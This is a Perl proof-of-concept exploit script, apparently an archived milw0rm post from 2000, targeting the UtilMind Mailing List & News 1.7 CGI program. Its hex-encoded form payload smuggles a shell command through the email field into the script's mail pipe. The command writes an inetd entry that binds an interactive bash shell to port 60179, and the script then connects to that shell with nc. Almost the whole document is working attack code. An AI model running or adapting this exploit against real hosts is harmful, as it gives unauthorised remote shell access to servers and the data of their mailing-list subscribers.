#!/usr/bin/perl -w

## Mailing List & News Version 1.7 / PoC Exploit.
## UtilMind Solutions / http://www.utilmind.com/
##
## Actually a pretty amusing exploit to write!
##
## The 'open(MAIL, "|$mailprog $address")' ...
## code sends e-mail to those who are on the
## mailing list - and the subscribers' e-mail
## addresses are located in a file called:
## maillist.txt. (could be called anything, really)
##
## So we sign on 'hass@ & echo 'fido stream tcp ..'
## and send out a mail to everyone on the list,
## including to our 'evil' address. Sending mail 
## to the subscribers is supposed to be limited 
## to those who know the password - but it really
## isn't - so we don't have to wait. <grin>
##
## Exploit will attempt to bind a shell at port 
## 60179/fido using inetd.
##
## http://teleh0r.cjb.net/ || teleh0r@doglover.com

use strict; use Socket;

if (@ARGV < 1) {
    print("Usage: $0 <target>\n");
    exit(1);
}

my($target,$agent,$cgicodea,$cgicodeb,$code,
   $iaddr,$paddr,$proto);

$target = $ARGV[0];
$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";

print("\nRemote host: $target\n");
print("CGI-script: /cgi-bin/maillist.cgi\n");

$code =
"POST /cgi-bin/maillist.cgi HTTP/1.0
Connection: Keep-Alive
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: 160

";

$cgicodea =

# Utilmind Solutions Maillist Portbinding Cgicode 
# Yes! it is meant as a joke!
"\x65\x6d\x61\x69\x6c\x3d\x68\x61\x73\x73\x40\x2b\x26".
"\x65\x63\x68\x6f\x2b\x27\x66\x69\x64\x6f\x2b\x73\x74".
"\x72\x65\x61\x6d\x2b\x74\x63\x70\x2b\x6e\x6f\x77\x61".
"\x69\x74\x2b\x6e\x6f\x62\x6f\x64\x79\x2b\x2f\x62\x69".
"\x6e\x2f\x62\x61\x73\x68\x2b\x62\x61\x73\x68\x2b\x2d".
"\x69\x27\x2b\x3e\x2b\x2f\x74\x6d\x70\x2f\x2e\x68\x61".
"\x73\x73\x3b\x2f\x75\x73\x72\x2f\x73\x62\x69\x6e\x2f".
"\x69\x6e\x65\x74\x64\x2b\x2f\x74\x6d\x70\x2f\x2e\x68".
"\x61\x73\x73\x26\x42\x31\x3d\x4f\x4b\x26\x61\x63\x74".
"\x69\x6f\x6e\x3d\x73\x75\x62\x73\x63\x72\x69\x62\x65";

$cgicodeb =
"subject=teleh0rz+cgi+warez&message=hass";

send_code();
print("\nSleeping 5 seconds - waiting for the shell ...\n\n");
sleep(5); system("nc -w 10 $target 60179"); exit(0);

# The sleep time may have to be longer - considering that the
# maillist.cgi script has a few e-mails to send. ;)

sub send_code {
    connect_host();
    send(SOCKET,"$code$cgicodea\015\012", 0)  || die("Error: $!\n");
    close(SOCKET); connect_host();
    send(SOCKET,"$code$cgicodeb\015\012", 0)  || die("Error: $!\n");
    close(SOCKET);
}

sub connect_host {
    $iaddr = inet_aton($target)                   || die("Error: $!\n");
    $paddr = sockaddr_in(80, $iaddr)              || die("Error: $!\n");
    $proto = getprotobyname('tcp')                || die("Error: $!\n");
    
    socket(SOCKET, PF_INET, SOCK_STREAM, $proto)  || die("Error: $!\n");
    connect(SOCKET, $paddr)                       || die("Error: $!\n");
}


# milw0rm.com [2000-11-17]
